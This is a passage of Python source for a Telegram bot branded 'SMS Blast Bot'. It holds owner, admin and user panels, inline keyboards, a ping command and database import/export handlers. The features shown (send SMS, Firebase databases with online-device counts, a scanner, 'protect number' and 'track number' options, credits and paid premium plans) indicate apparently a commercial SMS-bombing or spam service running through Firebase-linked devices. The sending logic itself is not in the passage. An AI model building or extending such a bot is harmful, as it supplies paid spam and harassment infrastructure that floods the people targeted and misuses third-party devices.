        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_BELL, '📢')} ᴀᴜᴛᴏ ᴍsɢ      : {am_status}\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '🔗')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    for fb_id, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    prem_until = int(udata.get("premium_until", 0))
    prem_line = (
        f"\n{em(EMOJI_CROWN, '💎')} ᴘʀᴇᴍɪᴜᴍ : <b>{fmt_time(prem_until)}</b>"
        if prem_until > int(time.time())
        else ""
    )
    return (
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>{prem_line}\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (
        btn("ᴅɪsᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ", "owner:free:off", EMOJI_CROSS, "🔴", style="danger")
        if d.get("free_mode")
        else btn("ᴇɴᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ", "owner:free:on", EMOJI_CHECK, "🟢", style="success")
    )
    am_enabled = d.get("auto_msg", {}).get("enabled", False)
    am_toggle_btn = (
        btn("sᴛᴏᴘ ᴀᴜᴛᴏ ᴍsɢ", "owner:automsg:stop", EMOJI_CROSS, "🛑", style="danger")
        if am_enabled
        else btn("sᴛᴀʀᴛ ᴀᴜᴛᴏ ᴍsɢ", "owner:automsg:start", EMOJI_CHECK, "🟢", style="success")
    )
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤", style="success"),
                btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥", style="primary"),
            ],
            [
                btn("sᴇᴛ ᴀᴜᴛᴏ ᴍsɢ", "owner:automsg:menu", EMOJI_BELL, "📢", style="primary"),
                am_toggle_btn,
            ],
            [
                btn("ɢɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ", "owner:prem:give", EMOJI_CROWN, "💎", style="success"),
                btn("ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs", "user:premium", EMOJI_MONEY, "👑", style="primary"),
            ],
            [
                btn("ɪᴍᴘᴏʀᴛ ᴅʙ", "owner:db:import", EMOJI_GEAR, "📥", style="success"),
                btn("ᴇxᴘᴏʀᴛ ᴅʙ", "owner:db:export", EMOJI_GEAR, "📤", style="primary"),
            ],
            [
                btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"),
                btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary"),
            ],
            [
                btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary"),
                btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥", style="primary"),
            ],
            [
                btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫", style="danger"),
                btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅", style="success"),
            ],
            [
                btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢", style="primary"),
                btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊", style="primary"),
            ],
            [
                btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜", style="primary"),
                btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳", style="primary"),
            ],
            [
                btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="primary"),
                btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰", style="success"),
            ],
            [
                btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰", style="danger"),
                btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰", style="success"),
            ],
            [
                btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰", style="danger"),
                btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary"),
            ],
            [
                btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"),
                btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋", style="primary"),
            ],
            [
                btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤", style="primary"),
                btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒", style="primary"),
            ],
            [
                btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary"),
                btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊", style="primary"),
            ],
            [mode_btn],
            [
                btn("ᴘɪɴɢ", "bot:ping", EMOJI_ROCKET, "🏓", style="success"),
                btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄", style="primary"),
            ],
        ]
    )

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤", style="success"),
                btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"),
            ],
            [
                btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="primary"),
                btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary"),
            ],
            [
                btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫", style="danger"),
                btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success"),
            ],
            [
                btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary"),
                btn("ᴘɪɴɢ", "bot:ping", EMOJI_ROCKET, "🏓", style="success"),
            ],
            [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
        ]
    )

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤", style="success")],
            [
                btn("ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs", "user:premium", EMOJI_CROWN, "💎", style="success"),
                btn("📹 ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹", style="primary"),
            ],
            [
                btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳", style="primary"),
                btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁", style="primary"),
            ],
            [
                btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥", style="primary"),
                btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊", style="primary"),
            ],
            [
                btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜", style="primary"),
                btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰", style="primary"),
            ],
            [
                btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", EMOJI_MONEY, "💸", style="primary"),
                btn("ᴘɪɴɢ", "bot:ping", EMOJI_ROCKET, "🏓", style="primary"),
            ],
            [btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️", style="primary")],
        ]
    )
def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴠɪᴅᴇᴏs", "owner:videos:bulk_del", EMOJI_CROSS, "🗑", style="danger")],
    ]
    for idx, _ in enumerate(videos, 1):
        rows.append([
            btn(f"Video #{idx}", "noop", EMOJI_VIDEO, "📹", style="primary"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑", style="danger"),
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start_idx = page * per_page
    end_idx = start_idx + per_page
    current_fbs = fbs[start_idx:end_idx]

    rows = [
        [
            btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕", style="success"),
            btn("ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄", style="primary"),
        ]
    ]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16:
            label = label[:14] + ".."
        rows.append([
            btn(label, "noop", EMOJI_FIRE, "🔥", style="primary"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑", style="danger"),
        ])

    nav_row = []
    if page > 0:
        nav_row.append(btn("ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if page < total_pages - 1:
        nav_row.append(btn("ɴᴇxᴛ", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav_row:
        rows.append(nav_row)

    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕", style="success")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑", style="primary")])
        else:
            rows.append([
                btn(f"{oid}", "noop", EMOJI_CROWN, "🔱", style="primary"),
                btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑", style="danger"),
            ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕", style="success")]]
    for aid in admins:
        rows.append([
            btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡", style="primary"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑", style="danger"),
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start : start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        prem_tag = " 💎" if has_active_premium(uid, d) else ""
        if uid in banned:
            status = em(EMOJI_CROSS, "🚫")
        elif uid in approved:
            status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d):
            status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]:
            status = em(EMOJI_SHIELD, "🛡")
        else:
            status = em(EMOJI_STAR, "👤")
        lines.append(
            f"{status} <code>{uid}</code> — {name[:18]}{prem_tag} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}"
        )

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0:
        nav.append(btn("ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if start + per < len(items):
        nav.append(btn("ɴᴇxᴛ", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav:
        rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>",
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        lines.append(
            f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {fb_stats.get('sent', 0)} sᴇɴᴛ  "
            f"{em(EMOJI_CROSS, '❌')} {fb_stats.get('failed', 0)} ғᴀɪʟᴇᴅ"
        )
    return "\n".join(lines)

def premium_plans_kb(d: dict) -> InlineKeyboardMarkup:
    plans = d.get("premium", {}).get("plans", DEFAULT_PREMIUM_PLANS)
    rows = []
    for i in range(0, len(plans), 2):
        row = []
        for p in plans[i : i + 2]:
            row.append(
                btn(
                    f"{p['label']} — ₹{p['price']}",
                    f"prem:buy:{p['id']}",
                    EMOJI_CROWN,
                    "💎",
                    style="success",
                )
            )
        rows.append(row)
    rows.append([btn("ᴄᴜsᴛᴏᴍ ᴘʀᴇᴍɪᴜᴍ", "prem:custom:menu", EMOJI_GIFT, "⚙️", style="primary")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def custom_prem_unit_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn("ᴅᴀʏs", "prem:custom:unit:days", EMOJI_STAR, "📅", style="success"),
                btn("ʜᴏᴜʀs", "prem:custom:unit:hours", EMOJI_WARNING, "⏰", style="primary"),
                btn("ᴍᴏɴᴛʜs", "prem:custom:unit:months", EMOJI_CROWN, "🗓", style="primary"),
            ],
            [btn("ʙᴀᴄᴋ", "user:premium", EMOJI_GEAR, "🔙", style="danger")],
        ]
    )

def auto_msg_kb(d: dict) -> InlineKeyboardMarkup:
    am = d.get("auto_msg", {})
    enabled = am.get("enabled", False)
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [btn("sᴇᴛ ᴀᴜᴛᴏ ᴍsɢ ᴛᴇxᴛ", "owner:automsg:set_text", EMOJI_BELL, "✏️", style="primary")],
            [
                btn("5 ᴍɪɴs", "owner:automsg:interval:5", EMOJI_ROCKET, "⏱", style="success"),
                btn("10 ᴍɪɴs", "owner:automsg:interval:10", EMOJI_ROCKET, "⏱", style="primary"),
                btn("ᴄᴜsᴛᴏᴍ ᴍɪɴ", "owner:automsg:interval:custom", EMOJI_GEAR, "⚙️", style="primary"),
            ],
            [
                btn("sᴛᴀʀᴛ ᴀᴜᴛᴏ ᴍsɢ", "owner:automsg:start", EMOJI_CHECK, "🟢", style="success")
                if not enabled
                else btn("sᴛᴏᴘ ᴀᴜᴛᴏ ᴍsɢ", "owner:automsg:stop", EMOJI_CROSS, "🛑", style="danger")
            ],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")],
        ]
    )

R = Router()

# ========== /PING & /ADMIN COMMANDS + PING CALLBACK ==========
@R.message(Command("ping"))
async def cmd_ping(msg: Message):
    t0 = time.perf_counter()
    m = await msg.answer(f"{em(EMOJI_ROCKET, '🏓')} <b>{sc('pinging...')}</b>", parse_mode="HTML")
    dt_ms = round((time.perf_counter() - t0) * 1000, 2)
    d = load()
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    try:
        await m.edit_text(
            f"{em(EMOJI_ROCKET, '🏓')} <b>{sc('pong!')}</b>\n\n"
            f"{em(EMOJI_CHECK, '⚡')} ʟᴀᴛᴇɴᴄʏ : <b>{dt_ms} ms</b>\n"
            f"{em(EMOJI_PHONE, '📱')} sᴄᴀɴɴᴇʀ : {get_scan_status()}\n"
            f"{em(EMOJI_STAR, '🚀')} ᴀᴄᴛɪᴠᴇ  : <b>{active_sessions}</b>\n"
            f"{em(EMOJI_GEAR, '📦')} ᴠᴇʀsɪᴏɴ : <b>{_VERSION}</b>\n"
            f"{em(EMOJI_STAR, '👥')} ᴜsᴇʀs   : <b>{len(d.get('users', {}))}</b>",
            parse_mode="HTML",
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "bot:ping")
async def cb_ping(cq: CallbackQuery):
    t0 = time.perf_counter()
    await cq.answer("🏓 Pinging...")
    dt_ms = round((time.perf_counter() - t0) * 1000, 2)
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    await cq.message.answer(
        f"{em(EMOJI_ROCKET, '🏓')} <b>{sc('pong!')}</b>\n\n"
        f"{em(EMOJI_CHECK, '⚡')} ʀᴇsᴘᴏɴsᴇ : <b>{dt_ms} ms</b>\n"
        f"{em(EMOJI_PHONE, '📱')} sᴄᴀɴɴᴇʀ  : {get_scan_status()}\n"
        f"{em(EMOJI_STAR, '🚀')} ᴀᴄᴛɪᴠᴇ   : <b>{active_sessions}</b>",
        parse_mode="HTML",
    )

@R.message(Command("admin"))
async def cmd_admin(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    reg_user(uid, msg.from_user.full_name or "User", d)
    save(d)
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
        return
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    await msg.answer(
        f"{em(EMOJI_CROSS, '⛔')} <b>Admin access nahi hai!</b>\nOwner: {SUPER_ADMIN_NAME}",
        parse_mode="HTML",
    )

# ========== DATABASE IMPORT & EXPORT ==========
@R.callback_query(F.data == "owner:db:export")
async def owner_db_export(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting database...")
    raw_bytes = json.dumps(d, indent=2, ensure_ascii=False).encode("utf-8")
    fname = f"blast_db_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    doc = BufferedInputFile(raw_bytes, filename=fname)
    await cq.message.reply_document(
        document=doc,
        caption=(
            f"{em(EMOJI_GEAR, '📤')} <b>Database Exported</b>\n\n"
            f"{em(EMOJI_STAR, '👥')} Users: <b>{len(d.get('users', {}))}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} Firebases: <b>{len(d.get('firebases', []))}</b>\n"
            f"{em(EMOJI_VIDEO, '📹')} Videos: <b>{len(d.get('videos', []))}</b>"
        ),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:db:import")
async def owner_db_import_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.import_db)
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, '📥')} <b>Import Database</b>\n\n"
        f"Apni backup <code>.json</code> file yahan upload karein.\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i>Existing database file is JSON se replace ho jayegi.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.import_db, F.document)
async def owner_db_import_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    doc = msg.document
    if not (doc.file_name or "").lower().endswith(".json"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf <code>.json</code> backup file bhejein!", parse_mode="HTML")
        return
    try:
        file_info = await msg.bot.get_file(doc.file_id)
        buf = await msg.bot.download_file(file_info.file_path)
        parsed = json.loads(buf.read().decode("utf-8"))
        if not isinstance(parsed, dict):
            raise ValueError("Root JSON must be an object")
        default = _default_data()
        for k, v in default.items():
            if k not in parsed:
                parsed[k] = v
        if MAIN_OWNER not in parsed.get("owners", []):
            parsed["owners"].insert(0, MAIN_OWNER)
        save(parsed)
        await state.clear()
        log_activity(parsed, "db_import", uid, f"Imported {doc.file_name}")
        save(load())
        await msg.answer(
            f"{em(EMOJI_CHECK, '✅')} <b>Database Successfully Imported!</b>\n\n"
            f"{em(EMOJI_STAR, '👥')} Users: <b>{len(parsed.get('users', {}))}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} Firebases: <b>{len(parsed.get('firebases', []))}</b>",
            reply_markup=owner_kb(load()),
            parse_mode="HTML",
        )
    except Exception as e:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Invalid JSON file: <code>{str(e)[:80]}</code>",
            parse_mode="HTML",
        )

@R.message(S.import_db)
async def owner_db_import_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid <code>.json</code> document upload karein!", parse_mode="HTML")

# ========== PREMIUM PLANS, CUSTOM DURATION & GIVE PREMIUM ==========
@R.callback_query(F.data == "user:premium")
async def user_premium_menu(cq: CallbackQuery, state: FSMContext):
